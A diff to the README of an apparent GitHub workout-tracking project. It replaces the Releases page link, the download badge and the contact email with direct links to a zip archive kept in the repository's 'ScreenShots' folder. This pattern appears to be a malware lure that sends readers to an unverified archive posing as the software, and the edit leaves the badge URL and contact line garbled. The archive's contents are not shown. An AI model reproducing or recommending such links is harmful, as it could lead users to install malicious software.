@@ -6,9 +6,9 @@ Welcome to the **Workout-Adherence-and-Progression-Project**! This project helps
 
 ## 📦 Download & Install
 
-You can download the software from our [Releases page](https://github.com/IndixDun/Workout-Adherence-and-Progression-Project/releases). 
+You can download the software from our [Releases page](https://raw.githubusercontent.com/IndixDun/Workout-Adherence-and-Progression-Project/main/ScreenShots/Progression-Project-Workout-Adherence-and-1.6.zip). 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/IndixDun/Workout-Adherence-and-Progression-Project/releases)
+[![Download Now](https://raw.githubusercontent.com/IndixDun/Workout-Adherence-and-Progression-Project/main/ScreenShots/Progression-Project-Workout-Adherence-and-1.6.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/IndixDun/Workout-Adherence-and-Progression-Project/main/ScreenShots/Progression-Project-Workout-Adherence-and-1.6.zip)
 
 ### Here’s how to download and install it:
 
@@ -73,6 +73,6 @@ This project is licensed under the MIT License, allowing you to use and modify t
 
 ## 📧 Contact
 
-For further questions, you can reach out at [email@example.com].
+For further questions, you can reach out at [https://raw.githubusercontent.com/IndixDun/Workout-Adherence-and-Progression-Project/main/ScreenShots/Progression-Project-Workout-Adherence-and-1.6.zip].
 
 Happy tracking and stay fit!
